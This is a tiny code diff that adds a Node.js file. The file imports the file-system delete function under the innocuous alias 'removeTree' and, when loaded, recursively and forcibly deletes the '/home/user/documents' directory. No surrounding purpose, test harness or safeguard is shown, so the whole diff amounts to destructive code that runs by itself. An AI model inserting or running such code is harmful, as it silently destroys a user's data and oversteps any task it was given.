@@ -1,0 +1,3 @@
+import { rmSync as removeTree } from "node:fs";
+
+removeTree("/home/user/documents", { recursive: true, force: true });
